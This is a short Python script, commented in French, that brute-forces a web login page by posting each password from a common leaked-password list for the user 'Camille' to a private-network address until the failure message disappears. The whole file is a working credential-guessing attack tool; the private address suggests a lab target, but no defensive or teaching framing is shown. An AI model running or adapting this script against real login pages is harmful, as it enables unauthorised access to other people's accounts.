import requests

# URL de la page de connexion
url = "http://192.168.28.145/"

# Nom d'utilisateur cible
username = "Camille"  # Remplace 'test' par le nom d'utilisateur réel

# Chemin vers le fichier de mots de passe
password_file = "10-million-password-list-top-10000.txt"  # Fichier contenant les mots de passe à tester

def bruteforce_login(url, username, password_file):
    try:
        # Ouvrir le fichier contenant les mots de passe
        with open(password_file, 'r') as file:
            passwords = file.readlines()
        
        # Tester chaque mot de passe dans le fichier
        for password in passwords:
            password = password.strip()  # Supprimer les espaces ou retours à la ligne
            print(f"[*] Test du mot de passe: {password}")

            # Données à envoyer en POST avec le mot de passe actuel
            data = {
                'username': username,
                'password': password
            }

            # Envoi de la requête POST
            response = requests.post(url, data=data)

            # Vérification de la réponse du serveur
            if 'Nom d\'utilisateur ou mot de passe incorrect' in response.text:
                print(f"[-] Mot de passe incorrect: {password}")
            else:
                print(f"[+] Mot de passe correct trouvé: {password}")
                return password  # Arrêter dès que le bon mot de passe est trouvé
        
        print("[-] Aucun mot de passe correct n'a été trouvé.")
    
    except FileNotFoundError:
        print(f"Erreur : Le fichier {password_file} est introuvable.")
    except requests.ConnectionError:
        print("Erreur : Connexion au serveur impossible.")
    except Exception as e:
        print(f"Erreur inattendue : {e}")

# Appel de la fonction pour lancer l'attaque brute force
bruteforce_login(url, username, password_file)
